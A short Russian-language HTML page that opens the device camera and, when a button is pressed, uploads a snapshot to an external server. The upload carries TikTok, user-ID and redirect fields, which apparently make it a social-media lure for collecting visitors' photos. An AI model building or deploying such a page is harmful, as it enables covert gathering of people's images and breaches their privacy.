<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Capture</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #000;
        }
        video {
            width: 100%;
            height: auto;
        }
        #capture-button {
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            padding: 12px 24px;
            font-size: 18px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        #capture-button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>

<!-- Видео-элемент для трансляции с камеры -->
<video id="video" autoplay></video>
<canvas id="canvas" style="display:none;"></canvas>
<button id="capture-button">Сделать снимок</button>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const captureButton = document.getElementById('capture-button');

    // Функция запроса доступа к камере
    function startCamera() {
        navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'environment' }  // Используем заднюю камеру
        })
        .then(stream => {
            video.srcObject = stream;
        })
        .catch(err => {
            console.error('Ошибка доступа к камере:', err);
            alert('Не удалось получить доступ к камере. Проверьте разрешения.');
        });
    }

    // Функция захвата фото
    function capturePhoto() {
        // Установка размеров canvas под размеры видео
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // Отрисовка кадра с видео на canvas
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Преобразование изображения в Blob
        canvas.toBlob(blob => {
            if (blob) {
                sendPhoto(blob);
            } else {
                console.error('Не удалось создать Blob');
            }
        }, 'image/jpeg');
    }

    // Функция отправки фото на сервер
    function sendPhoto(blob) {
        const formData = new FormData();
        formData.append('photo', blob, 'photo.jpg');
        formData.append('tiktok_url', 'https://www.tiktok.com/example_video');
        formData.append('user_id', '12345');
        formData.append('redirect_url', 'https://www.redirect.com');

        fetch('https://rusfai-send-photo-f9d0.twc1.net/tiktok', {
            method: 'POST',
            body: formData
        })
        .then(response => response.text())
        .then(result => {
            console.log('Фото успешно отправлено:', result);
        })
        .catch(error => {
            console.error('Ошибка отправки:', error);
        });
    }

    // Запуск камеры при загрузке страницы
    window.addEventListener('load', startCamera);

    // Обработка нажатия на кнопку "Сделать снимок"
    captureButton.addEventListener('click', capturePhoto);
</script>

</body>
</html>
